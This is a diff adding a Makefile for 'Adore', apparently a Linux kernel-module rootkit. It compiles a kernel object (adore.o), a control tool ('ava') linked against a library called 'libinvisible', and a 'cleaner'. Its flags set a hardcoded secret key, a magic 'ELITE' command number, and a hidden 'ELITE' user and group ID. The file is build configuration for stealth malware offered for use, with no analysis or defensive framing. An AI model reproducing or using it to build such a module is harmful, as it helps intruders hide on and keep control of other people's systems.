@@ -1,0 +1,46 @@
+# Adore Makefile
+# (when configure fails)
+# Please set the flags you need!!!
+
+CC=cc 
+CFLAGS=-O2 -Wall -I/usr/src/linux/include
+CFLAGS+=-DADORE_KEY=\"mysecret\"
+
+
+# Normally not needed. Just for cross-plattform.
+# compilation
+#CFLAGS+=-m486
+
+# should be changed to own value
+CFLAGS+=-DELITE_CMD=30000
+
+# make sure this doesnt clash with existing users
+CFLAGS+=-DELITE_UID=12345 -DELITE_GID=6789
+
+# Do not touch!
+CFLAGS+=-DCURRENT_ADORE=50
+
+# enable when modversions are enables in kernel
+#CFLAGS+=-DMODVERSIONS
+
+# enable when target is SMP
+#CFLAGS+=-D__SMP__
+
+# this does not support exec-redirection
+
+all:	adore ava cleaner
+
+adore: adore.c
+	rm -f adore.o
+	$(CC) -c -I/usr/src/linux/include $(CFLAGS) adore.c -o adore.o
+
+ava: ava.c libinvisible.c
+	$(CC) $(CFLAGS) ava.c libinvisible.c -o ava
+
+dummy: dummy.c
+	$(CC) -c -I/usr/src/linux/include $(CFLAGS) dummy.c
+
+rename: rename.c
+	$(CC) -c -I/usr/src/linux/include $(CFLAGS) rename.c
+
+
